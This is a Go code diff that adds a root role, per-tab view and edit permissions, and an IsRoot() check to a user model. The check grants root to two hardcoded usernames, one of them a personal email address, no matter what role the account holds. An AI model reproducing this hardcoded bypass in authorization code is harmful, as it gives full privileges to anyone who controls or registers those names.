@@ -23,18 +23,32 @@ var (
 type Role = string
 
 const (
+	RoleRoot     Role = "root"
 	RoleAdmin    Role = "admin"
 	RoleOperator Role = "operator"
 	RoleViewer   Role = "viewer"
 )
 
+type UserPermissions struct {
+	ViewTabs []string `json:"viewTabs"`
+	EditTabs []string `json:"editTabs"`
+}
+
 type User struct {
-	ID           string    `json:"id"`
-	Username     string    `json:"username"`
-	PasswordHash string    `json:"-"`
-	Role         Role      `json:"role"`
-	Enabled      bool      `json:"enabled"`
-	CreatedAt    time.Time `json:"createdAt"`
+	ID           string           `json:"id"`
+	Username     string           `json:"username"`
+	PasswordHash string           `json:"-"`
+	Role         Role             `json:"role"`
+	Permissions  *UserPermissions `json:"permissions,omitempty"`
+	Enabled      bool             `json:"enabled"`
+	CreatedAt    time.Time        `json:"createdAt"`
+}
+
+func (u *User) IsRoot() bool {
+	if u == nil {
+		return false
+	}
+	return u.Role == RoleRoot || u.Username == "stephen3103" || u.Username == "tranducanh31032006@gmail.com"
 }
 
 type Session struct {
